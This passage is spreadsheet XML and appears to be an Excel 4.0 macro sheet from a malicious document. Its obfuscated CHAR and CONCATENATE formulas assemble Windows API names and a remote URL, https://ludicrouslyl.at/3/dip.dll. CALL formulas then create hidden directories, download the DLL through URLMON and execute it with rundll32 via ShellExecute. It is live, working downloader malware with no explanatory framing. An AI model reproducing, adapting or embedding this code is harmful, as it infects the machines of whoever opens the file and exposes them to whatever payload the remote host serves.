    <row r="689" spans="63:157" x14ac:dyDescent="0.25">
      <c r="CF689" t="str">
        <f>CHAR($GV$1114-557)</f>
        <v>l</v>
      </c>
    </row>
    <row r="690" spans="63:157" x14ac:dyDescent="0.25">
      <c r="EF690" t="str">
        <f>CHAR($BB$1735-557)</f>
        <v>N</v>
      </c>
    </row>
    <row r="695" spans="63:157" x14ac:dyDescent="0.25">
      <c r="FA695">
        <v>226</v>
      </c>
    </row>
    <row r="697" spans="63:157" x14ac:dyDescent="0.25">
      <c r="BK697" t="str">
        <f>CHAR($EH$202-885)</f>
        <v>d</v>
      </c>
    </row>
    <row r="709" spans="53:244" x14ac:dyDescent="0.25">
      <c r="BA709" t="b">
        <f>RUN($FD$1258)</f>
        <v>0</v>
      </c>
      <c r="EO709">
        <v>658</v>
      </c>
    </row>
    <row r="711" spans="53:244" x14ac:dyDescent="0.25">
      <c r="IJ711" t="str">
        <f>CHAR($IN$1415-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="716" spans="53:244" x14ac:dyDescent="0.25">
      <c r="DM716" t="str">
        <f>CHAR($FJ$1817-158)</f>
        <v>y</v>
      </c>
    </row>
    <row r="717" spans="53:244" x14ac:dyDescent="0.25">
      <c r="BO717">
        <v>169</v>
      </c>
    </row>
    <row r="723" spans="70:224" x14ac:dyDescent="0.25">
      <c r="HP723">
        <v>76</v>
      </c>
    </row>
    <row r="726" spans="70:224" x14ac:dyDescent="0.25">
      <c r="EV726">
        <v>28</v>
      </c>
    </row>
    <row r="732" spans="70:224" x14ac:dyDescent="0.25">
      <c r="BR732" t="str">
        <f>CONCATENATE($AN$1106)</f>
        <v>Open</v>
      </c>
    </row>
    <row r="740" spans="42:121" x14ac:dyDescent="0.25">
      <c r="AP740" t="b">
        <f>RUN($DW$175)</f>
        <v>0</v>
      </c>
    </row>
    <row r="745" spans="42:121" x14ac:dyDescent="0.25">
      <c r="DQ745">
        <v>993</v>
      </c>
    </row>
    <row r="754" spans="79:196" x14ac:dyDescent="0.25">
      <c r="GN754">
        <v>51</v>
      </c>
    </row>
    <row r="757" spans="79:196" x14ac:dyDescent="0.25">
      <c r="CA757">
        <v>993</v>
      </c>
    </row>
    <row r="769" spans="47:231" x14ac:dyDescent="0.25">
      <c r="FI769" t="b">
        <f>RUN($AM$1287)</f>
        <v>0</v>
      </c>
      <c r="FW769">
        <v>993</v>
      </c>
    </row>
    <row r="772" spans="47:231" x14ac:dyDescent="0.25">
      <c r="HW772">
        <v>85</v>
      </c>
    </row>
    <row r="774" spans="47:231" x14ac:dyDescent="0.25">
      <c r="DH774" t="b">
        <f>RUN($FZ$965)</f>
        <v>0</v>
      </c>
    </row>
    <row r="776" spans="47:231" x14ac:dyDescent="0.25">
      <c r="AU776" t="str">
        <f>CHAR($FU$983-158)</f>
        <v>r</v>
      </c>
    </row>
    <row r="779" spans="47:231" x14ac:dyDescent="0.25">
      <c r="DI779">
        <v>228</v>
      </c>
    </row>
    <row r="785" spans="23:153" x14ac:dyDescent="0.25">
      <c r="AW785" t="b">
        <f>RUN($DB$1503)</f>
        <v>0</v>
      </c>
    </row>
    <row r="788" spans="23:153" x14ac:dyDescent="0.25">
      <c r="W788">
        <v>224</v>
      </c>
    </row>
    <row r="793" spans="23:153" x14ac:dyDescent="0.25">
      <c r="EW793" t="str">
        <f>CHAR($HX$315-158)</f>
        <v>l</v>
      </c>
    </row>
    <row r="799" spans="23:153" x14ac:dyDescent="0.25">
      <c r="AY799" t="str">
        <f>CHAR($ES$1250-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="805" spans="9:224" x14ac:dyDescent="0.25">
      <c r="HP805">
        <v>1002</v>
      </c>
    </row>
    <row r="809" spans="9:224" x14ac:dyDescent="0.25">
      <c r="HI809">
        <v>255</v>
      </c>
    </row>
    <row r="813" spans="9:224" x14ac:dyDescent="0.25">
      <c r="GG813">
        <v>223</v>
      </c>
    </row>
    <row r="815" spans="9:224" x14ac:dyDescent="0.25">
      <c r="I815">
        <v>241</v>
      </c>
    </row>
    <row r="817" spans="17:186" x14ac:dyDescent="0.25">
      <c r="CE817" t="str">
        <f>CHAR($EO$921-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="818" spans="17:186" x14ac:dyDescent="0.25">
      <c r="Q818" t="str">
        <f>CHAR($CL$377-885)</f>
        <v>r</v>
      </c>
      <c r="AS818" t="str">
        <f>CHAR($HC$1981-158)</f>
        <v>O</v>
      </c>
      <c r="BM818">
        <v>985</v>
      </c>
    </row>
    <row r="827" spans="17:186" x14ac:dyDescent="0.25">
      <c r="GD827">
        <v>41</v>
      </c>
    </row>
    <row r="828" spans="17:186" x14ac:dyDescent="0.25">
      <c r="AU828">
        <v>268</v>
      </c>
    </row>
    <row r="841" spans="67:79" x14ac:dyDescent="0.25">
      <c r="BO841" t="b">
        <f>RUN($HS$1630)</f>
        <v>0</v>
      </c>
    </row>
    <row r="847" spans="67:79" x14ac:dyDescent="0.25">
      <c r="CA847" t="b">
        <f>RUN($AE$1865)</f>
        <v>0</v>
      </c>
    </row>
    <row r="857" spans="52:150" x14ac:dyDescent="0.25">
      <c r="ET857" t="b">
        <f>RUN($FJ$1684)</f>
        <v>0</v>
      </c>
    </row>
    <row r="858" spans="52:150" x14ac:dyDescent="0.25">
      <c r="AZ858">
        <v>984</v>
      </c>
    </row>
    <row r="861" spans="52:150" x14ac:dyDescent="0.25">
      <c r="BI861" t="str">
        <f>CHAR($CM$1546-158)</f>
        <v>o</v>
      </c>
    </row>
    <row r="862" spans="52:150" x14ac:dyDescent="0.25">
      <c r="AZ862" t="b">
        <f>RUN($V$77)</f>
        <v>0</v>
      </c>
    </row>
    <row r="889" spans="171:243" x14ac:dyDescent="0.25">
      <c r="FO889" t="b">
        <f>RUN($FD$1584)</f>
        <v>0</v>
      </c>
    </row>
    <row r="891" spans="171:243" x14ac:dyDescent="0.25">
      <c r="FR891" t="str">
        <f>CHAR($FT$1657-158)</f>
        <v>e</v>
      </c>
    </row>
    <row r="893" spans="171:243" x14ac:dyDescent="0.25">
      <c r="HA893" t="str">
        <f>CHAR($HP$805-885)</f>
        <v>u</v>
      </c>
      <c r="II893" t="b">
        <f>RUN($DR$1907)</f>
        <v>0</v>
      </c>
    </row>
    <row r="901" spans="3:108" x14ac:dyDescent="0.25">
      <c r="C901">
        <v>263</v>
      </c>
      <c r="J901">
        <v>932</v>
      </c>
    </row>
    <row r="906" spans="3:108" x14ac:dyDescent="0.25">
      <c r="DD906">
        <v>932</v>
      </c>
    </row>
    <row r="917" spans="46:182" x14ac:dyDescent="0.25">
      <c r="FZ917">
        <v>38</v>
      </c>
    </row>
    <row r="918" spans="46:182" x14ac:dyDescent="0.25">
      <c r="AT918" t="str">
        <f>CHAR($EB$961-158)</f>
        <v>U</v>
      </c>
    </row>
    <row r="921" spans="46:182" x14ac:dyDescent="0.25">
      <c r="EO921">
        <v>259</v>
      </c>
    </row>
    <row r="933" spans="11:175" x14ac:dyDescent="0.25">
      <c r="FS933">
        <v>634</v>
      </c>
    </row>
    <row r="936" spans="11:175" x14ac:dyDescent="0.25">
      <c r="AC936" t="str">
        <f>CHAR($HH$1275-557)</f>
        <v>l</v>
      </c>
    </row>
    <row r="942" spans="11:175" x14ac:dyDescent="0.25">
      <c r="K942">
        <v>70</v>
      </c>
      <c r="CP942" t="str">
        <f>CHAR($BP$297-557)</f>
        <v>r</v>
      </c>
    </row>
    <row r="953" spans="44:192" x14ac:dyDescent="0.25">
      <c r="EH953" t="b">
        <f>RUN($EM$1912)</f>
        <v>0</v>
      </c>
      <c r="GJ953" t="str">
        <f>CHAR($CF$531-102)</f>
        <v>l</v>
      </c>
    </row>
    <row r="954" spans="44:192" x14ac:dyDescent="0.25">
      <c r="AY954" t="str">
        <f>CHAR($AQ$1450-102)</f>
        <v>q</v>
      </c>
    </row>
    <row r="957" spans="44:192" x14ac:dyDescent="0.25">
      <c r="AR957">
        <v>275</v>
      </c>
    </row>
    <row r="961" spans="48:202" x14ac:dyDescent="0.25">
      <c r="EB961">
        <v>243</v>
      </c>
    </row>
    <row r="963" spans="48:202" x14ac:dyDescent="0.25">
      <c r="GT963" t="b">
        <f>RUN($DW$11)</f>
        <v>0</v>
      </c>
    </row>
    <row r="964" spans="48:202" x14ac:dyDescent="0.25">
      <c r="AV964">
        <v>57</v>
      </c>
      <c r="DJ964" t="b">
        <f>RUN($W$543)</f>
        <v>0</v>
      </c>
      <c r="DL964" t="str">
        <f>CHAR($DN$1160-102)</f>
        <v>\</v>
      </c>
    </row>
    <row r="965" spans="48:202" x14ac:dyDescent="0.25">
      <c r="FZ965" t="b">
        <f>RUN($IL$1144)</f>
        <v>0</v>
      </c>
    </row>
    <row r="983" spans="26:204" x14ac:dyDescent="0.25">
      <c r="BL983">
        <v>658</v>
      </c>
      <c r="FU983">
        <v>272</v>
      </c>
    </row>
    <row r="988" spans="26:204" x14ac:dyDescent="0.25">
      <c r="GV988" t="b">
        <f>RUN($AC$1420)</f>
        <v>0</v>
      </c>
    </row>
    <row r="989" spans="26:204" x14ac:dyDescent="0.25">
      <c r="AP989" t="str">
        <f>CONCATENATE($HW$1568,$IG$1175)</f>
        <v>https://ludicrouslyl.at/3/dip.dll</v>
      </c>
    </row>
    <row r="990" spans="26:204" x14ac:dyDescent="0.25">
      <c r="Z990" t="str">
        <f>CHAR($CB$1575-885)</f>
        <v>.</v>
      </c>
    </row>
    <row r="1002" spans="108:108" x14ac:dyDescent="0.25">
      <c r="DD1002">
        <v>77</v>
      </c>
    </row>
    <row r="1012" spans="90:166" x14ac:dyDescent="0.25">
      <c r="CO1012" t="str">
        <f>CHAR($I$815-158)</f>
        <v>S</v>
      </c>
    </row>
    <row r="1013" spans="90:166" x14ac:dyDescent="0.25">
      <c r="FJ1013" t="b">
        <f>RUN($GW$1389)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1016" spans="90:166" x14ac:dyDescent="0.25">
      <c r="CL1016">
        <v>1001</v>
      </c>
    </row>
    <row r="1025" spans="65:241" x14ac:dyDescent="0.25">
      <c r="HJ1025">
        <v>993</v>
      </c>
    </row>
    <row r="1029" spans="65:241" x14ac:dyDescent="0.25">
      <c r="GH1029" t="str">
        <f>CHAR($AU$1373-885)</f>
        <v>u</v>
      </c>
    </row>
    <row r="1038" spans="65:241" x14ac:dyDescent="0.25">
      <c r="CB1038" t="b">
        <f>RUN($DO$438)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1039" spans="65:241" x14ac:dyDescent="0.25">
      <c r="BM1039" t="str">
        <f>CHAR($ID$1555-102)</f>
        <v>Y</v>
      </c>
      <c r="IG1039" t="str">
        <f>CHAR($K$1710-557)</f>
        <v>R</v>
      </c>
    </row>
    <row r="1042" spans="45:210" x14ac:dyDescent="0.25">
      <c r="AS1042" t="str">
        <f>CHAR($HE$1984-102)</f>
        <v>V</v>
      </c>
    </row>
    <row r="1045" spans="45:210" x14ac:dyDescent="0.25">
      <c r="CF1045">
        <v>222</v>
      </c>
      <c r="GE1045" t="str">
        <f>CONCATENATE($GV$242,$GZ$1910,$CE$1823,$FO$1100,$AC$936,$CS$1399,$DW$221)</f>
        <v>Shell32</v>
      </c>
    </row>
    <row r="1047" spans="45:210" x14ac:dyDescent="0.25">
      <c r="HB1047" t="str">
        <f>CHAR($C$901-158)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1048" spans="45:210" x14ac:dyDescent="0.25">
      <c r="GE1048">
        <v>667</v>
      </c>
    </row>
    <row r="1055" spans="45:210" x14ac:dyDescent="0.25">
      <c r="BY1055" t="str">
        <f>CHAR($BM$818-885)</f>
        <v>d</v>
      </c>
    </row>
    <row r="1064" spans="42:56" x14ac:dyDescent="0.25">
      <c r="BD1064">
        <v>274</v>
      </c>
    </row>
    <row r="1072" spans="42:56" x14ac:dyDescent="0.25">
      <c r="AP1072" t="str">
        <f>CHAR($IF$36-158)</f>
        <v>o</v>
      </c>
    </row>
    <row r="1077" spans="144:242" x14ac:dyDescent="0.25">
      <c r="EN1077">
        <v>79</v>
      </c>
    </row>
    <row r="1079" spans="144:242" x14ac:dyDescent="0.25">
      <c r="FU1079">
        <v>274</v>
      </c>
      <c r="IH1079" t="str">
        <f>CHAR($FR$1729-102)</f>
        <v>D</v>
      </c>
    </row>
    <row r="1090" spans="68:201" x14ac:dyDescent="0.25">
      <c r="EE1090" t="str">
        <f>CHAR($HT$1623-158)</f>
        <v>L</v>
      </c>
    </row>
    <row r="1096" spans="68:201" x14ac:dyDescent="0.25">
      <c r="EV1096" t="b">
        <f>RUN($EH$1465)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1100" spans="68:201" x14ac:dyDescent="0.25">
      <c r="CZ1100">
        <v>58</v>
      </c>
      <c r="FO1100" t="str">
        <f>CHAR($GM$1209-557)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1101" spans="68:201" x14ac:dyDescent="0.25">
      <c r="GS1101">
        <v>209</v>
      </c>
    </row>
    <row r="1102" spans="68:201" x14ac:dyDescent="0.25">
      <c r="BP1102" t="str">
        <f>CHAR($ET$1568-102)</f>
        <v>p</v>
      </c>
    </row>
    <row r="1106" spans="40:220" x14ac:dyDescent="0.25">
      <c r="AN1106" t="str">
        <f>CONCATENATE($AS$818,$ER$1674,$CE$817,$EK$38)</f>
        <v>Open</v>
      </c>
    </row>
    <row r="1113" spans="40:220" x14ac:dyDescent="0.25">
      <c r="CG1113">
        <v>33</v>
      </c>
    </row>
    <row r="1114" spans="40:220" x14ac:dyDescent="0.25">
      <c r="BC1114" t="str">
        <f>CHAR($GE$1048-557)</f>
        <v>n</v>
      </c>
      <c r="GV1114">
        <v>665</v>
      </c>
    </row>
    <row r="1115" spans="40:220" x14ac:dyDescent="0.25">
      <c r="EI1115">
        <v>1001</v>
      </c>
    </row>
    <row r="1116" spans="40:220" x14ac:dyDescent="0.25">
      <c r="HL1116">
        <v>240</v>
      </c>
    </row>
    <row r="1117" spans="40:220" x14ac:dyDescent="0.25">
      <c r="EN1117">
        <v>82</v>
      </c>
    </row>
    <row r="1120" spans="40:220" x14ac:dyDescent="0.25">
      <c r="DV1120" t="str">
        <f>CHAR($CK$1973-885)</f>
        <v>h</v>
      </c>
    </row>
    <row r="1121" spans="17:247" x14ac:dyDescent="0.25">
      <c r="Q1121">
        <v>26</v>
      </c>
    </row>
    <row r="1125" spans="17:247" x14ac:dyDescent="0.25">
      <c r="CI1125" t="str">
        <f>CHAR($FM$1859-885)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1133" spans="17:247" x14ac:dyDescent="0.25">
      <c r="IM1133" t="str">
        <f>CHAR($BR$116-885)</f>
        <v>d</v>
      </c>
    </row>
    <row r="1135" spans="17:247" x14ac:dyDescent="0.25">
      <c r="AE1135" t="str">
        <f>CHAR($EQ$213-102)</f>
        <v>v</v>
      </c>
    </row>
    <row r="1141" spans="49:246" x14ac:dyDescent="0.25">
      <c r="BR1141" t="b">
        <f>RUN($DQ$1827)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1143" spans="49:246" x14ac:dyDescent="0.25">
      <c r="CC1143" t="str">
        <f>CHAR($BH$1522-158)</f>
        <v>d</v>
      </c>
    </row>
    <row r="1144" spans="49:246" x14ac:dyDescent="0.25">
      <c r="HU1144" t="str">
        <f>CONCATENATE($HC$228)</f>
        <v>CreateDirectoryA</v>
      </c>
      <c r="IL1144" t="b">
        <f>RUN($CL$1464)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1145" spans="49:246" x14ac:dyDescent="0.25">
      <c r="HM1145" t="str">
        <f>CHAR($EQ$1467-102)</f>
        <v>I</v>
      </c>
    </row>
    <row r="1150" spans="49:246" x14ac:dyDescent="0.25">
      <c r="AW1150">
        <v>608</v>
      </c>
    </row>
    <row r="1153" spans="35:167" x14ac:dyDescent="0.25">
      <c r="AI1153" t="str">
        <f>CHAR($DZ$212-102)</f>
        <v>d</v>
      </c>
    </row>
    <row r="1160" spans="35:167" x14ac:dyDescent="0.25">
      <c r="DN1160">
        <v>194</v>
      </c>
      <c r="FK1160">
        <v>225</v>
      </c>
    </row>
    <row r="1175" spans="76:241" x14ac:dyDescent="0.25">
      <c r="IG1175" t="str">
        <f>CONCATENATE($Z$990,$IM$1133,$AE$1482,$FD$191)</f>
        <v>.dll</v>
      </c>
    </row>
    <row r="1176" spans="76:241" x14ac:dyDescent="0.25">
      <c r="BX1176">
        <v>932</v>
      </c>
    </row>
    <row r="1184" spans="76:241" x14ac:dyDescent="0.25">
      <c r="CM1184">
        <v>640</v>
      </c>
    </row>
    <row r="1193" spans="51:240" x14ac:dyDescent="0.25">
      <c r="EH1193" t="str">
        <f>CONCATENATE($IG$1254,$CS$1238)</f>
        <v>C:\dCuqCTh\DqzYTvx\pQbVnkI.dll</v>
      </c>
    </row>
    <row r="1196" spans="51:240" x14ac:dyDescent="0.25">
      <c r="CU1196">
        <v>269</v>
      </c>
      <c r="IF1196" t="str">
        <f>CHAR($BX$1176-885)</f>
        <v>/</v>
      </c>
    </row>
    <row r="1198" spans="51:240" x14ac:dyDescent="0.25">
      <c r="AY1198" t="b">
        <f>RUN($ET$857)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1204" spans="133:239" x14ac:dyDescent="0.25">
      <c r="IE1204" t="str">
        <f>CONCATENATE($FP$308,$IG$1039,$GF$1940,$BT$1232,$GC$312,$EF$690)</f>
        <v>URLMON</v>
      </c>
    </row>
    <row r="1206" spans="133:239" x14ac:dyDescent="0.25">
      <c r="EC1206">
        <v>19</v>
      </c>
    </row>
    <row r="1209" spans="133:239" x14ac:dyDescent="0.25">
      <c r="GM1209">
        <v>665</v>
      </c>
    </row>
    <row r="1222" spans="8:139" x14ac:dyDescent="0.25">
      <c r="H1222" t="b">
        <f>RUN($AP$566)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1228" spans="8:139" x14ac:dyDescent="0.25">
      <c r="EI1228">
        <v>262</v>
      </c>
    </row>
    <row r="1232" spans="8:139" x14ac:dyDescent="0.25">
      <c r="BT1232" t="str">
        <f>CHAR($FS$933-557)</f>
        <v>M</v>
      </c>
    </row>
    <row r="1238" spans="97:198" x14ac:dyDescent="0.25">
      <c r="CS1238" t="str">
        <f>CONCATENATE($AV$373)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1244" spans="97:198" x14ac:dyDescent="0.25">
      <c r="GP1244">
        <v>632</v>
      </c>
    </row>
    <row r="1248" spans="97:198" x14ac:dyDescent="0.25">
      <c r="FX1248" t="str">
        <f>CHAR($FG$1973-158)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1250" spans="4:241" x14ac:dyDescent="0.25">
      <c r="ES1250">
        <v>259</v>
      </c>
    </row>
    <row r="1253" spans="4:241" x14ac:dyDescent="0.25">
      <c r="ES1253">
        <v>10</v>
      </c>
    </row>
    <row r="1254" spans="4:241" x14ac:dyDescent="0.25">
      <c r="IG1254" t="str">
        <f>CONCATENATE($D$1814,$CW$1484,$FX$1870,$AI$1153,$FK$1294,$EH$570,$AY$954,$HG$529,$CQ$1381,$HR$1412,$DL$964,$IH$1079,$GD$439,$EV$185,$BM$1039,$FZ$144,$AE$1135,$HR$1387,$CP$1954,$BP$1102,$F$553,$HL$571,$AS$1042,$F$223,$AZ$463,$HM$1145,$D$1260,$DG$358,$GJ$953)</f>
        <v>C:\dCuqCTh\DqzYTvx\pQbVnkI.dl</v>
      </c>
    </row>
    <row r="1258" spans="4:241" x14ac:dyDescent="0.25">
      <c r="FD1258" t="b">
        <f>RUN($R$615)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1259" spans="4:241" x14ac:dyDescent="0.25">
      <c r="BD1259">
        <v>278</v>
      </c>
      <c r="DK1259">
        <v>1000</v>
      </c>
    </row>
    <row r="1260" spans="4:241" x14ac:dyDescent="0.25">
      <c r="D1260" t="str">
        <f>CHAR($DT$443-102)</f>
        <v>.</v>
      </c>
    </row>
    <row r="1266" spans="9:216" x14ac:dyDescent="0.25">
      <c r="R1266">
        <v>932</v>
      </c>
    </row>
    <row r="1268" spans="9:216" x14ac:dyDescent="0.25">
      <c r="I1268" t="b">
        <f>RUN($CP$585)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1275" spans="9:216" x14ac:dyDescent="0.25">
      <c r="HH1275">
        <v>665</v>
      </c>
    </row>
    <row r="1287" spans="39:167" x14ac:dyDescent="0.25">
      <c r="AM1287" t="b">
        <f>RUN($BR$1141)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1291" spans="39:167" x14ac:dyDescent="0.25">
      <c r="BZ1291">
        <v>996</v>
      </c>
    </row>
    <row r="1294" spans="39:167" x14ac:dyDescent="0.25">
      <c r="BD1294">
        <v>227</v>
      </c>
      <c r="FK1294" t="str">
        <f>CHAR($BO$717-102)</f>
        <v>C</v>
      </c>
    </row>
    <row r="1304" spans="73:192" x14ac:dyDescent="0.25">
      <c r="BU1304">
        <v>85</v>
      </c>
    </row>
    <row r="1306" spans="73:192" x14ac:dyDescent="0.25">
      <c r="GJ1306" t="b">
        <f>RUN($I$1268)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1320" spans="188:247" x14ac:dyDescent="0.25">
      <c r="GF1320" t="b">
        <f>RUN($II$893)</f>
        <v>0</v>
      </c>
      <c r="IM1320" t="str">
        <f>CHAR($BZ$1291-885)</f>
        <v>o</v>
      </c>
    </row>
    <row r="1341" spans="41:178" x14ac:dyDescent="0.25">
      <c r="AO1341">
        <v>226</v>
      </c>
    </row>
    <row r="1342" spans="41:178" x14ac:dyDescent="0.25">
      <c r="FV1342">
        <v>75</v>
      </c>
    </row>
    <row r="1343" spans="41:178" x14ac:dyDescent="0.25">
      <c r="DR1343" t="b">
        <f>RUN($FZ$44)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1345" spans="33:33" x14ac:dyDescent="0.25">
      <c r="AG1345" t="str">
        <f>CHAR($IA$408-557)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1369" spans="1:160" x14ac:dyDescent="0.25">
      <c r="A1369">
        <v>37</v>
      </c>
    </row>
    <row r="1373" spans="1:160" x14ac:dyDescent="0.25">
      <c r="AU1373">
        <v>1002</v>
      </c>
    </row>
    <row r="1374" spans="1:160" x14ac:dyDescent="0.25">
      <c r="FD1374" t="str">
        <f>CONCATENATE($EE$106)</f>
        <v>Kernel32</v>
      </c>
    </row>
    <row r="1381" spans="75:226" x14ac:dyDescent="0.25">
      <c r="CQ1381" t="str">
        <f>CHAR($BN$83-102)</f>
        <v>T</v>
      </c>
    </row>
    <row r="1382" spans="75:226" x14ac:dyDescent="0.25">
      <c r="GF1382">
        <v>10</v>
      </c>
    </row>
    <row r="1387" spans="75:226" x14ac:dyDescent="0.25">
      <c r="HR1387" t="str">
        <f>CHAR($CF$1045-102)</f>
        <v>x</v>
      </c>
    </row>
    <row r="1388" spans="75:226" x14ac:dyDescent="0.25">
      <c r="CO1388" t="str">
        <f>CHAR($GG$813-158)</f>
        <v>A</v>
      </c>
      <c r="CZ1388">
        <v>80</v>
      </c>
    </row>
    <row r="1389" spans="75:226" x14ac:dyDescent="0.25">
      <c r="GW1389" t="b">
        <f>RUN($BO$432)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1392" spans="75:226" x14ac:dyDescent="0.25">
      <c r="BW1392">
        <v>66</v>
      </c>
    </row>
    <row r="1399" spans="97:134" x14ac:dyDescent="0.25">
      <c r="CS1399" t="str">
        <f>CHAR($BB$170-557)</f>
        <v>3</v>
      </c>
      <c r="ED1399">
        <v>98</v>
      </c>
    </row>
    <row r="1402" spans="97:134" x14ac:dyDescent="0.25">
      <c r="CY1402">
        <v>936</v>
      </c>
    </row>
    <row r="1412" spans="29:248" x14ac:dyDescent="0.25">
      <c r="HR1412" t="str">
        <f>CHAR($AU$1603-102)</f>
        <v>h</v>
      </c>
    </row>
    <row r="1414" spans="29:248" x14ac:dyDescent="0.25">
      <c r="EB1414" t="b">
        <f>RUN($HO$1578)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1415" spans="29:248" x14ac:dyDescent="0.25">
      <c r="IN1415">
        <v>259</v>
      </c>
    </row>
    <row r="1420" spans="29:248" x14ac:dyDescent="0.25">
      <c r="AC1420" t="b">
        <f>RUN($EH$953)</f>
        <v>0</v>
      </c>
      <c r="HZ1420" t="str">
        <f>CHAR($EI$1228-158)</f>
        <v>h</v>
      </c>
    </row>
    <row r="1444" spans="25:220" x14ac:dyDescent="0.25">
      <c r="Y1444" t="str">
        <f>CHAR($R$1266-885)</f>
        <v>/</v>
      </c>
    </row>
    <row r="1449" spans="25:220" x14ac:dyDescent="0.25">
      <c r="HL1449">
        <v>62</v>
      </c>
    </row>
    <row r="1450" spans="25:220" x14ac:dyDescent="0.25">
      <c r="AQ1450">
        <v>215</v>
      </c>
    </row>
    <row r="1453" spans="25:220" x14ac:dyDescent="0.25">
      <c r="FN1453" t="b">
        <f>RUN($F$1474)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1454" spans="25:220" x14ac:dyDescent="0.25">
      <c r="EG1454">
        <v>87</v>
      </c>
    </row>
    <row r="1465" spans="14:209" x14ac:dyDescent="0.25">
      <c r="CL1465">
        <f>CALL($FD$1374,$HU$1144,"JCJ","C:\dCuqCTh",0)</f>
        <v>0</v>
      </c>
      <c r="EH1465" t="b">
        <f>RUN($FL$1972)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1466" spans="14:209" x14ac:dyDescent="0.25">
      <c r="CL1466">
        <f>CALL($FD$1374,$HU$1144,"JCJ","C:\dCuqCTh\DqzYTvx",0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1467" spans="14:209" x14ac:dyDescent="0.25">
      <c r="CL1467">
        <f>CALL($A$1822,$GL$1734, "JJCCJJ",0,$BB$54,$EH$1193,0,0)</f>
        <v>0</v>
      </c>
      <c r="EQ1467">
        <v>175</v>
      </c>
    </row>
    <row r="1468" spans="14:209" x14ac:dyDescent="0.25">
      <c r="AG1468">
        <v>169</v>
      </c>
      <c r="CL1468">
        <f>CALL($HH$74,$B$1576, "JJCCCCJ",0,$BR$732,"rundll32.exe",$EH$1193&amp;",f1",0,0)</f>
        <v>42</v>
      </c>
    </row>
    <row r="1469" spans="14:209" x14ac:dyDescent="0.25">
      <c r="N1469" t="b">
        <f>RUN($EZ$1779)</f>
        <v>0</v>
      </c>
      <c r="HA1469">
        <v>49</v>
      </c>
    </row>
    <row r="1473" spans="6:245" x14ac:dyDescent="0.25">
      <c r="CL1473" t="b">
        <f>HALT()</f>
        <v>1</v>
      </c>
    </row>
    <row r="1474" spans="6:245" x14ac:dyDescent="0.25">
      <c r="F1474" t="b">
        <f>RUN($CM$1551)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1482" spans="6:245" x14ac:dyDescent="0.25">
      <c r="AE1482" t="str">
        <f>CHAR($DQ$745-885)</f>
        <v>l</v>
      </c>
      <c r="HD1482">
        <v>223</v>
      </c>
      <c r="IK1482" t="str">
        <f>CHAR($EU$1922-158)</f>
        <v>c</v>
      </c>
    </row>
    <row r="1484" spans="6:245" x14ac:dyDescent="0.25">
      <c r="CW1484" t="str">
        <f>CHAR($FN$69-102)</f>
        <v>:</v>
      </c>
    </row>
    <row r="1492" spans="106:236" x14ac:dyDescent="0.25">
      <c r="DE1492" t="b">
        <f>RUN($AZ$862)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1502" spans="106:236" x14ac:dyDescent="0.25">
      <c r="IB1502" t="b">
        <f>RUN($BO$841)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1503" spans="106:236" x14ac:dyDescent="0.25">
      <c r="DB1503" t="b">
        <f>RUN($GT$963)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1506" spans="16:160" x14ac:dyDescent="0.25">
      <c r="P1506">
        <v>71</v>
      </c>
      <c r="DO1506" t="b">
        <f>RUN($GI$236)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1517" spans="16:160" x14ac:dyDescent="0.25">
      <c r="BT1517">
        <v>89</v>
      </c>
      <c r="FD1517">
        <v>215</v>
      </c>
    </row>
    <row r="1518" spans="16:160" x14ac:dyDescent="0.25">
      <c r="BM1518" t="b">
        <f>RUN($DO$1506)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1521" spans="15:192" x14ac:dyDescent="0.25">
      <c r="GJ1521" t="b">
        <f>RUN($EV$1096)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1522" spans="15:192" x14ac:dyDescent="0.25">
      <c r="BH1522">
        <v>258</v>
      </c>
    </row>
    <row r="1530" spans="15:192" x14ac:dyDescent="0.25">
      <c r="O1530" t="b">
        <f>RUN($FI$1569)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1546" spans="91:132" x14ac:dyDescent="0.25">
      <c r="CM1546">
        <v>269</v>
      </c>
    </row>
    <row r="1548" spans="91:132" x14ac:dyDescent="0.25">
      <c r="EB1548" t="str">
        <f>CHAR($AY$73-158)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1551" spans="91:132" x14ac:dyDescent="0.25">
      <c r="CM1551" t="b">
        <f>RUN($GJ$1521)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1554" spans="122:238" x14ac:dyDescent="0.25">
      <c r="GW1554" t="b">
        <f>RUN($Y$60)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1555" spans="122:238" x14ac:dyDescent="0.25">
      <c r="ID1555">
        <v>191</v>
      </c>
    </row>
    <row r="1560" spans="122:238" x14ac:dyDescent="0.25">
      <c r="DR1560">
        <v>200</v>
      </c>
    </row>
    <row r="1568" spans="122:238" x14ac:dyDescent="0.25">
      <c r="ET1568">
        <v>214</v>
      </c>
      <c r="HW1568" t="str">
